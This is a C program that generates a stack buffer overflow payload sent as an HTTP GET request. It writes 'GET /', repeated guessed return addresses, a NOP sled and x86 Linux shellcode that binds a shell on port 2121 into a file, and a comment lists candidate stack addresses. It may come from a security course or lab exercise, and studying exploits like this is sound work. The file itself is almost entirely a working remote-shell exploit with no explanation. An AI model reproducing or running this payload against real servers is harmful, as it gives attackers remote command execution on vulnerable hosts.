#include <stdlib.h>
#include <stdio.h>


/*
Address on local machine

0xffffd0e8
\xe8\xd0\xff\xff


Addresses from lowest stack value up

\x00\xb0\xfe\xbf
\x2c\xb1\xfe\xbf
\x58\xb2\xfe\xbf
\x84\xb3\xfe\xbf
\xb0\xb4\xfe\xbf
\xdc\xb5\xfe\xbf
\x08\xb7\xfe\xbf
\x34\xb8\xfe\xbf
\x60\xb9\xfe\xbf
\x8c\xba\xfe\xbf
\xb0\xfe\xff\xbf



Addresses from highest stack address value down

0xBFFFFED3
0xBFFFFDA7
0xBFFFFC7B
0xBFFFFB4F
0xBFFFFA23
0xBFFFF8F7
0xBFFFF7CB

\xd3\xfe\xff\xbf
\xa7\xfd\xff\xbf
\x7b\xfc\xff\xbf
\x4f\xfb\xff\xbf
\x23\xfa\xff\xbf
\xf7\xf8\xff\xbf
\xcb\xf7\xff\xbf

*/

//Open up shell at 2121
char shellcodefile[] = "shellcode.dat";
char shellcode[] = "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x08\x49\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80";
char address[] = "\xa7\xfd\xff\xbf";
char noop[] = "\x90";

int main(int argc, char** argv) {
    int stringIndex;
    freopen (shellcodefile, "w", stdout);
    printf ("GET /");
    for(stringIndex=0;stringIndex<50;stringIndex++) { // offsetReturnAddresses
        printf("%s", address); 
    }
    for(stringIndex=0;stringIndex<555;stringIndex++) { //offsetBlankSpace
        printf("%s", noop); 
    }
    printf ("%s ", shellcode);
    printf ("HTTP");
    fclose (stdout);
    return 0;
}